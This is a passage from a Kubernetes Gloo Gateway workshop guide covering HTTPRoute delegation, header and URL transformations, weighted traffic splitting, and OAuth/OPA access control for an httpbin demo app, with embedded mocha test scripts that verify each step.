          kind: HTTPRoute
EOF
```

The team in charge of the httpbin application can now create a child `HTTPRoute`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
```

Check you can still access the application through HTTPS:

```bash,noexecute
curl -k https://httpbin.example.com/get
```

Here is the expected output:

```json,nocopy
{
  "args": {},
  "headers": {
    "Accept": [
      "*/*"
    ],
    "Host": [
      "httpbin.example.com"
    ],
    "User-Agent": [
      "curl/8.5.0"
    ],
    "X-Forwarded-Proto": [
      "https"
    ],
    "X-Request-Id": [
      "11037632-92c8-43c7-b919-7d7c7217c564"
    ]
  },
  "method": "GET",
  "origin": "127.0.0.6:51121",
  "url": "https://httpbin.example.com/get"
}
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/https.test.js.liquid from lab number 14"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 14"; exit 1; }
-->

In the previous example, we've used a simple `/` prefix matcher for both the parent and the child `HTTPRoute`.

But we'll often use the delegation capability to delegate a specific path to an application team.

For example, let's say the team in charge of the gateway wants to delegate the `/status` prefix to the team in charge of the httpbin application.

Let's update the parent `HTTPRoute`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /status
      backendRefs:
        - name: '*'
          namespace: httpbin
          group: gateway.networking.k8s.io
          kind: HTTPRoute
EOF
```

Now, we can update the child `HTTPRoute` to match requests with the `/status/200` path:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: Exact
          value: /status/200
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
```

Check you can access the `/status/200` path:

```bash,noexecute
curl -k https://httpbin.example.com/status/200 -w "%{http_code}"
```

Here is the expected output:

```,nocopy
200
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid from lab number 14"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 14"; exit 1; }
-->

In the child `HTTPRoute` we've indicated the absolute path (which includes the parent path), but instead we can inherite the parent matcher and use a relative path:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
  annotations:
    delegation.gateway.solo.io/inherit-parent-matcher: "true"
spec:
  rules:
    - matches:
      - path:
          type: Exact
          value: /200
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
```

Check you can still access the `/status/200` path:

```bash,noexecute
curl -k https://httpbin.example.com/status/200 -w "%{http_code}"
```

Here is the expected output:

```,nocopy
200
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid from lab number 14"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 14"; exit 1; }
-->

The team in charge of the httpbin application can also take advantage of the `parentRefs` option to indicate which parent `HTTPRoute` can delegate to its own `HTTPRoute`.

That's why you don't need to use `ReferenceGrant` objects when using delegation.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
  annotations:
    delegation.gateway.solo.io/inherit-parent-matcher: "true"
spec:
  parentRefs:
    - name: httpbin
      namespace: gloo-system
      group: gateway.networking.k8s.io
      kind: HTTPRoute
  rules:
    - matches:
      - path:
          type: Exact
          value: /200
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
```

Check you can still access the `/status/200` path:

```bash,noexecute
curl -k https://httpbin.example.com/status/200 -w "%{http_code}"
```

Here is the expected output:

```,nocopy
200
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid from lab number 14"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 14"; exit 1; }
-->

Delegation offers another very nice feature. It automatically reorders all the matchers to avoid any short-circuiting.

Let's add a second child `HTTPRoute` which is matching for any request starting with the path `/status`, but sends the requests to the second httpbin service.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin-status
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /status
      backendRefs:
        - name: httpbin2
          port: 8000
EOF
```

If the matcher for `/status` is positioned before the matcher for `/status/200`, the latter would be ignored. So, all the requests would be sent to the second httpbin service.

Check you can still access the `/status/200` path:

```bash,noexecute
curl -k https://httpbin.example.com/status/200 -w "%{http_code}"
```

Here is the expected output:

```,nocopy
200
```

You can use the following command to validate the request has still been handled by the first httpbin application.

```bash,noexecute
kubectl logs --context ${CLUSTER1} -n httpbin -l app=httpbin1 | grep curl | grep 200
```

You should get an output similar to:

```log,nocopy
time="2024-07-22T16:02:51.9508" status=200 method="GET" uri="/status/200" size_bytes=0 duration_ms=0.03 user_agent="curl/7.81.0" client_ip=10.101.0.13:58114
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'200\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/200', retCode: 200 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-200.test.js.liquid from lab number 14"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 14"; exit 1; }
-->

Check you can now also access the status `/status/201` path:

```bash,noexecute
curl -k https://httpbin.example.com/status/201 -w "%{http_code}"
```

Here is the expected output:

```,nocopy
201
```

You can use the following command to validate this request has been handled by the second httpbin application.

```bash,noexecute
kubectl logs --context ${CLUSTER1} -n httpbin -l app=httpbin2 | grep curl | grep 201
```

You should get an output similar to:

```log,nocopy
time="2024-07-22T16:04:53.3189" status=201 method="GET" uri="/status/201" size_bytes=0 duration_ms=0.02 user_agent="curl/7.81.0" client_ip=10.101.0.13:52424
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking \'201\' status code', () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/status/201', retCode: 201 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/status-201.test.js.liquid from lab number 14"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 14"; exit 1; }
-->

Let's delete the latest `HTTPRoute` and apply the original ones:

```bash
kubectl delete --context ${CLUSTER1} -n httpbin httproute httpbin-status

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https-httpbin
  hostnames:
    - "httpbin.example.com"
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: '*'
          namespace: httpbin
          group: gateway.networking.k8s.io
          kind: HTTPRoute
EOF

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin through HTTPS", () => {
  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation/tests/https.test.js.liquid from lab number 14"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 14"; exit 1; }
-->



## Lab 15 - Modify the requests and responses <a name="lab-15---modify-the-requests-and-responses-"></a>

The Kubernetes Gateway API provides different options to add/update/remove request and response headers.

Let's start with request headers.

Update the `HTTPRoute` resource to do the following:
- add a new header `Foo` with the value `bar`
- update the value of the header `User-Agent` to `custom`
- remove the `To-Remove` header

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
      filters:
        - type: RequestHeaderModifier
          requestHeaderModifier:
            add:
              - name: Foo
                value: bar
            set:
              - name: User-Agent
                value: custom
            remove:
              - To-Remove
EOF
```

Try to access the application (with the `To-Remove` request header added):

```bash,noexecute
curl -k https://httpbin.example.com/get -H 'To-Remove: whatever'
```

Here is the expected output:

```json,nocopy
{
  "args": {},
  "headers": {
    ...
    "Foo": [
      "bar"
    ],
    ...
    "User-Agent": [
      "custom"
    ],
    ...
}
```

The transformations have been applied as expected.

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("request transformations applied", () => {
  it('Checking text \'bar\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'bar', match: true }));
  it('Checking text \'custom\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'custom', match: true }));
  it('Checking text \'To-Remove\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'To-Remove', match: false }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/request-headers.test.js.liquid from lab number 15"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
-->

Another typical use case is to rewrite the hostname or the path before sending the request to the backend.

Update the `HTTPRoute` resource to do the following:
- rewrite the hostname to `httpbin1.com`
- rewrite the path to `/get`

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /publicget
      backendRefs:
        - name: httpbin1
          port: 8000
      filters:
        - type: URLRewrite
          urlRewrite:
            hostname: httpbin1.com
            path:
              type: ReplacePrefixMatch
              replacePrefixMatch: /get
EOF
```

Try to access the application:

```bash,noexecute
curl -k https://httpbin.example.com/publicget
```

Here is the expected output:

```json,nocopy
{
  "args": {},
  "headers": {
    "Accept": [
      "*/*"
    ],
    "Host": [
      "httpbin1.com"
    ],
    "User-Agent": [
      "curl/8.5.0"
    ],
    "X-Envoy-Original-Path": [
      "/publicget"
    ],
    "X-Forwarded-Proto": [
      "https"
    ],
    "X-Request-Id": [
      "1aee27e0-dfab-4b3a-869c-23e3e214440e"
    ]
  },
  "method": "GET",
  "origin": "127.0.0.6:33021",
  "url": "https://httpbin1.com/get"
}
```


The transformations have been applied as expected.

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("request rewrite applied", () => {
  it('Checking text \'httpbin1.com/get\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/publicget', body: 'httpbin1.com/get', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/request-rewrite.test.js.liquid from lab number 15"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
-->


Let's now apply transformations to response headers.

Update the `HTTPRoute` resource to do the following:
- add a new header `Foo` with the value `bar`
- update the value of the header `To-Modify` to `newvalue`
- remove the `To-Remove` header

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
      filters:
        - type: ResponseHeaderModifier
          responseHeaderModifier:
            add:
              - name: Foo
                value: bar
            set:
              - name: To-Modify
                value: newvalue
            remove:
              - To-Remove
EOF
```

Try to access the application (with the `To-Modify` and `To-Remove` response headers added):

```bash,noexecute
curl -k "https://httpbin.example.com/response-headers?to-remove=whatever&to-modify=oldvalue" -I
```

Here is the expected output:

```http,nocopy
HTTP/2 200
access-control-allow-credentials: true
access-control-allow-origin: *
content-type: application/json; charset=utf-8
date: Thu, 20 Jun 2024 17:02:36 GMT
x-envoy-upstream-service-time: 1
server: envoy
x-envoy-decorator-operation: httpbin1.httpbin.svc.cluster.local:8000/*
to-modify: newvalue
foo: bar
```

The transformations have been applied as expected.

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("response transformations applied", () => {
  it('Checking \'Foo\' and \'To-Modify\' headers', () => helpersHttp.checkHeaders({ host: `https://httpbin.example.com`, path: '/response-headers?to-remove=whatever&to-modify=oldvalue', expectedHeaders: [{'key': 'foo', 'value': 'bar'}, {'key': 'to-modify', 'value': 'newvalue'}]}));
  it('Checking text \'To-Remove\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/response-headers?to-remove=whatever&to-modify=oldvalue', body: 'To-Remove', match: false }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/response-headers.test.js.liquid from lab number 15"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
-->

Let's apply the original `HTTPRoute` yaml:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
```

All these transformations are great, but there are many cases where more flexibility is required.

For example, you may want to create a new header from a value of another header.

Gloo Gateway provides some [extensions](https://docs.solo.io/gateway/latest/traffic-management/transformations/) to manipulate requests and responses in a more advanced way.

Let's extract the product name from the `User-Agent` header (getting rid of the product version and comments).

To do that we need to create a Gloo Gateway `RouteOption` object:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: httpbin
  options:
    stagedTransformations:
      regular:
        requestTransforms:
        - requestTransformation:
            transformationTemplate:
              extractors:
                client:
                  header: 'User-Agent'
                  regex: '^([^/\s]+).*'
                  subgroup: 1
              headers:
                x-client:
                  text: "{{ client }}"
EOF
```

Try to access the application:

```bash,noexecute
curl -k https://httpbin.example.com/get
```

Here is the expected output:

```json,nocopy
{
  "args": {},
  "headers": {
    "Accept": [
      "*/*"
    ],
    "Host": [
      "httpbin.example.com"
    ],
    "User-Agent": [
      "curl/8.5.0"
    ],
    "X-Client": [
      "curl"
    ],
    "X-Envoy-Expected-Rq-Timeout-Ms": [
      "15000"
    ],
    "X-Forwarded-Proto": [
      "https"
    ],
    "X-Request-Id": [
      "49dd1010-9388-4d50-b4c7-298cec409f3d"
    ]
  },
  "method": "GET",
  "origin": "127.0.0.6:48727",
  "url": "https://httpbin.example.com/get"
}
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("request transformation applied", () => {
  it('Checking text \'X-Client\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-agent', value: 'curl/8.5.0'}], body: 'X-Client', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/x-client-request-header.test.js.liquid from lab number 15"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
-->

As you can see, we've created a new header called `X-Client` by extracting some data from the `User-Agent` header using a regular expression.

And we've targetted the `HTTPRoute` using the `targetRefs` of the `RouteOption` object. With this approach, it applies to all its rules.

Another nice capability of the Gloo Gateway transformation filter is the capability to add a response header from some information present in the request.

For example, we can add a `X-Request-Id` response header with the same value than the `X-Request-Id` request header. The user could use this information to report an issue he had with a specific request, for example.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  options:
    stagedTransformations:
      regular:
        responseTransforms:
        - responseTransformation:
            transformationTemplate:
              headers:
                x-request-id:
                  text: '{{ request_header("X-Request-Id") }}'
EOF
```

This time, we haven't used the `targetRefs` option. Instead, we're going to update the `HTTPRoute` object to target the `RouteOption` object. This way you can apply it to a single rule.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
```

Try to access the application:

```bash,noexecute
curl -k "https://httpbin.example.com/get" -I
```

Here is the expected output:

```http,nocopy
HTTP/2 200
access-control-allow-credentials: true
access-control-allow-origin: *
date: Tue, 23 Jul 2024 13:13:53 GMT
x-envoy-upstream-service-time: 0
x-request-id: 67052060-3b22-4782-8078-1344b26a774a
server: envoy
```

You can see the `X-Request-Id` response header has been added correctly.

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("response transformation applied", () => {
  it('Checking \'X-Request-Id\' header', () => helpersHttp.checkHeaders({ host: `https://httpbin.example.com`, path: '/get', expectedHeaders: [{'key': 'x-request-id', 'value': '*'}]}));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/transformations/tests/x-request-id-response-header.js.liquid from lab number 15"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 15"; exit 1; }
-->

Let's apply the original `HTTPRoute` yaml:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
```

Let's delete the `RouteOption` object:
```bash
kubectl delete --context ${CLUSTER1} -n httpbin routeoption routeoption
```




## Lab 16 - Split traffic between 2 backend services <a name="lab-16---split-traffic-between-2-backend-services-"></a>

You can split traffic between different backends, with different weights.

It's useful to slowly introduce a new version.

Update the `HTTPRoute` resource to do the following:
- send 80% of the traffic to the `httpbin1` service
- send 20% of the traffic to the `httpbin2` service

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      backendRefs:
        - name: httpbin1
          port: 8000
          weight: 80
        - name: httpbin2
          port: 8000
          weight: 20
EOF
```

Try to access the application several times, using the `/hostname` endpoint which returns the hostname of the pod that handled the request:

```bash,noexecute
curl -k https://httpbin.example.com/hostname
```

Most of the time, the request will be sent to `httpbin1`:

```json,nocopy
{
  "hostname": "httpbin1-7c4498d4c4-ksxdm"
}
```

But sometimes, it will be sent to `httpbin2`:

```json,nocopy
{
  "hostname": "httpbin2-789dfb64d6-trsxw"
}
```

The traffic has been split as expected.

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("traffic split applied", () => {
  it('Checking text \'httpbin1\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/hostname', body: 'httpbin1', match: true }));
  it('Checking text \'httpbin2\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/hostname', body: 'httpbin2', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/traffic-split/tests/traffic-split.test.js.liquid from lab number 16"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 16"; exit 1; }
-->




## Lab 17 - Securing the access with OAuth <a name="lab-17---securing-the-access-with-oauth-"></a>

In this step, we're going to secure the access to the `httpbin` service using OAuth.

First, we need to create an `AuthConfig`, which is a CRD that contains authentication information. We've already got a secret named `oauth` that we can reference in this policy:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: oauth
  namespace: httpbin
spec:
  configs:
    - oauth2:
        oidcAuthorizationCode:
          appUrl: "https://httpbin.example.com"
          callbackPath: /callback
          clientId: ${KEYCLOAK_CLIENT}
          clientSecretRef:
            name: oauth
            namespace: gloo-system
          issuerUrl: "${KEYCLOAK_URL}/realms/workshop/"
          logoutPath: /logout
          afterLogoutUrl: "https://httpbin.example.com/get"
          session:
            failOnFetchFailure: true
            redis:
              cookieName: keycloak-session
              options:
                host: redis:6379
          scopes:
          - email
          headers:
            idTokenHeader: jwt
          identityToken:
            claimsToHeaders:
              - claim: email
                header: X-Email
EOF
```



After that, you need to create a `RouteOption`, to reference the `AuthConfig`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption
  namespace: httpbin
spec:
  options:
    extauth:
      configRef:
        name: oauth
        namespace: httpbin
EOF
```

You can use this diagram to understand the order in which the different options are applied.

![Traffic filter flow](images/steps/extauth-oauth/traffic-filter-flow.svg)

Finally, you need to update the `HTTPRoute` to use this `RouteOption`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: httpbin
  namespace: httpbin
spec:
  rules:
    - matches:
      - path:
          type: PathPrefix
          value: /
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption
      backendRefs:
        - name: httpbin1
          port: 8000
EOF
```

<!--bash
ATTEMPTS=1
timeout 60 bash -c 'while [[ "$(curl -m 2 --max-time 2 --insecure -s -o /dev/null -w ''%{http_code}'' https://httpbin.example.com/get)" != "302" ]]; do sleep 5; done'
export USER1_COOKIE=$(node tests/keycloak-token.js "https://httpbin.example.com/get" user1)
export USER2_COOKIE=$(node tests/keycloak-token.js "https://httpbin.example.com/get" user2)
ATTEMPTS=1
until ([ ! -z "$USER2_COOKIE" ] && [[ $USER2_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export USER2_COOKIE=$(node tests/keycloak-token.js "https://httpbin.example.com/get" user2)
done
ATTEMPTS=1
until ([ ! -z "$USER1_COOKIE" ] && [[ $USER1_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export USER1_COOKIE=$(node tests/keycloak-token.js "https://httpbin.example.com/get" user1)
done
echo "User1 token: $USER1_COOKIE"
echo "User2 token: $USER2_COOKIE"
-->

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function () {
  const cookieString = process.env.USER1_COOKIE;

  it("The httpbin page isn't accessible without authenticating", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', retCode: 302 }));

  it("The httpbin page is accessible after authenticating", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], retCode: 200 }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/authentication.test.js.liquid from lab number 17"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 17"; exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Claim to header is working properly", function() {
  const cookieString = process.env.USER2_COOKIE;
  it('The new header has been added', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], body: 'user2@solo.io' }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-oauth/tests/header-added.test.js.liquid from lab number 17"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 17"; exit 1; }
-->

If you refresh the web browser, you will be redirected to the authentication page.

If you use the username `user1` and the password `password` you should be redirected back to the `httpbin` application.

Notice that we are also extracting information from the `email` claim, and putting it into a new header. This can be used for different things during our authz/authn flow, but most importantly we don't need any jwt-decoding library in the application anymore!

You can also perform authorization using OPA.

First, you need to create a `ConfigMap` with the policy written in rego:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: allow-solo-email-users
  namespace: httpbin
data:
  policy.rego: |-
    package test

    default allow = false

    allow {
        [header, payload, signature] = io.jwt.decode(input.state.jwt)
        endswith(payload["email"], "@solo.io")
    }
EOF
```

Then, you need to update the `AuthConfig` object to add the authorization step:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: oauth
  namespace: httpbin
spec:
  configs:
    - oauth2:
        oidcAuthorizationCode:
          appUrl: "https://httpbin.example.com"
          callbackPath: /callback
          clientId: ${KEYCLOAK_CLIENT}
          clientSecretRef:
            name: oauth
            namespace: gloo-system
          issuerUrl: "${KEYCLOAK_URL}/realms/workshop/"
          logoutPath: /logout
          afterLogoutUrl: "https://httpbin.example.com/get"
          session:
            failOnFetchFailure: true
            redis:
              cookieName: keycloak-session
              options:
                host: redis:6379
          scopes:
          - email
          headers:
            idTokenHeader: jwt
          identityToken:
            claimsToHeaders:
              - claim: email
                header: X-Email
    - opaAuth:
        modules:
        - name: allow-solo-email-users
          namespace: httpbin
        query: "data.test.allow == true"
EOF
```

Refresh the web page. `user1` shouldn't be allowed to access it anymore since the user's email ends with `@example.com`.
<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function () {

  const cookieString_user1 = process.env.USER1_COOKIE;
  const cookieString_user2 = process.env.USER2_COOKIE;

  it("The httpbin page isn't accessible with user1", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString_user1 }], retCode: "keycloak-session=dummy" == cookieString_user1 ? 302 : 403 }));
  it("The httpbin page is accessible with user2", () => helpersHttp.checkURL({ host: `https://httpbin.example.com`, path: '/get', headers: [{ key: 'Cookie', value: cookieString_user2 }], retCode: 200 }));

});

EOF
